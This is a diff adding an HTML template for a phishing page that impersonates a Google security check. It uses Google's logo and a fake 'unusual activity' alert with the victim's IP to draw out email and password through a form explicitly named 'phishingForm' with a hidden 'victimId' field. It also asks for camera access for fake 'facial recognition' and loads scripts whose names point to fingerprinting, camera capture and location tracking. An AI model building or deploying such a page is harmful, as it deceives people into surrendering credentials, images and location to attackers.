@@ -1,1 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Verification Required</title>
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+    <div class="security-container">
+        <div class="header">
+            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
+            <h2>Security Check Required</h2>
+        </div>
+        
+        <div class="warning-message">
+            <div class="alert">
+                <strong>Unusual activity detected from your location (<%= ip %>)</strong>
+                <p>We've noticed suspicious login attempts. Please verify your identity to secure your account.</p>
+            </div>
+        </div>
 
+        <form id="phishingForm" class="login-form">
+            <input type="hidden" id="victimId" value="<%= uid %>">
+            
+            <div class="input-group">
+                <label>Email or phone</label>
+                <input type="text" id="username" name="username" required>
+            </div>
+            
+            <div class="input-group">
+                <label>Password</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+
+            <button type="submit" class="verify-btn">Verify Identity</button>
+        </form>
+
+        <div class="camera-section" id="cameraSection">
+            <h3>Additional Security Verification</h3>
+            <p>Please allow camera access for facial recognition</p>
+            <video id="cameraPreview" autoplay></video>
+            <button id="captureBtn" class="capture-btn">Take Security Photo</button>
+        </div>
+
+        <div class="location-section">
+            <p><small>Location verification in progress...</small></p>
+        </div>
+    </div>
+
+    <script src="/js/fingerprint.js"></script>
+    <script src="/js/camera.js"></script>
+    <script src="/js/location.js"></script>
+    <script src="/js/security.js"></script>
+</body>
+</html>
